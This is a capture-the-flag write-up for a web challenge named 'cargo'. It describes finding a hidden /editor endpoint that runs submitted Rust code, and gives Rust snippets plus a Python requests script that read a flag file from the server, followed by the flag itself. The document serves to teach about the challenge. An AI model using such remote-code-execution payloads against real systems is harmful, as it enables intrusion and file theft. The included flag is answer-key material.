# cargo Challenge Writeup

> **Category**: Web\
> **Author**: Stefan

## TL;DR
Hidden path that executes input as Rust code.

---

## Challenge Description
The challenge involves a web application that is in "maintenance" mode. However, there is a hidden path that allows us to execute Rust code on the server.

## Solution

### Step 1: Using Dirbuster to Find Hidden Paths
I started by using Dirbuster to scan the web application for hidden paths. After running the scan, I discovered the `/editor` path.

<img src="https://i.imgur.com/I4K8oQz.png" alt="Dirbuster Scan" width="400"/>

It is a playground for code execution. The server accepts input and runs it.

### Step 2: Sending a POST Request to `/editor`
Next, I sent a POST request to the `/editor` path with the parameter `codename=a`. The server responds, revealing that it executes Rust code.

<img src="https://i.imgur.com/rab8QVY.png" alt="POST Request" width="600"/>

### Step 3: Crafting Rust Code to Read the Root Directory
Knowing that the server executes Rust code, I crafted a Rust script to read the contents of the root directory. There, I found a folder named flag39283761 and read its contents using the following Rust code:

```rust
use std::fs;

fn main() {
    let paths = fs::read_dir("/flag39283761").unwrap();

    for path in paths {
        println!("{}", path.unwrap().path().display());
    }
}
```
> **Note**: I used CyberChef to URL encode the Rust code before sending it to the server

Running this code, it returns a file named `flag2781263` inside the `/flag39283761` directory.

<img src="https://i.imgur.com/8QEzyfl.png" alt="Directory Listing" width="600"/>

### Step 4: Reading the Flag File
Finally, I crafted another Rust script to read the contents of the `flag2781263` file:

```rust
use std::fs;

fn main() {
    let contents = fs::read_to_string("/flag39283761/flag2781263").expect("Unable to read file");
    println!("{}", contents);
}
```

Running this request in Burp Suite, it successfully retrieved the flag.

<img src="https://i.imgur.com/sgpzJ3D.png" alt="Flag Content" width="600"/>

## Script
```py
import requests
import re

url = "http://34.107.71.117:32677/editor"
headers = {
    "Host": "34.107.71.117:32677",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded"
}
payload = {
    "codename": """use std::fs;

fn main() {
    let contents = fs::read_to_string("/flag39283761/flag2781263").expect("Unable to read file");
    println!("{}", contents);
}
"""
}

r = requests.post(url, headers=headers, data=payload)
pattern = r'CTF\{[0-9a-fA-F]{64}\}'
match = re.search(pattern, r.text)
if match:
    print(match.group())
else:
    print(r.text)

```
## Flag
`CTF{c7d604ecd0da6804f45d958b4c5fb622488250bd05c29b99d0134f3bfdda2fc4}`